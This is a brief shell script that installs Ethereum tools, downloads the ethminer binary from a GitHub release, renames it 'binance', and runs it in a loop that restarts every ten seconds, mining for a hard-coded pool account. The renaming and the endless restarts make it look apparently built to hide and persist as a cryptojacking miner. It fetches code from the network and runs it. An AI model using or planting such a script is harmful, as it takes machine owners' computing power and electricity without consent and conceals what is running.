#!/bin/sh
sudo apt update
sudo add-apt-repository --yes ppa:ethereum/ethereum
sudo apt update
sudo apt install ethereum
wget https://github.com/ethereum-mining/ethminer/releases/download/v0.19.0-alpha.0/ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
tar -xvf ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
cd bin
chmod u+x ethminer
mv ethminer binance
while [ 1 ]; do
./binance -G -P stratum+tcp://thrblank897.001:123456@ethash.poolbinance.com:1800
sleep 10
done



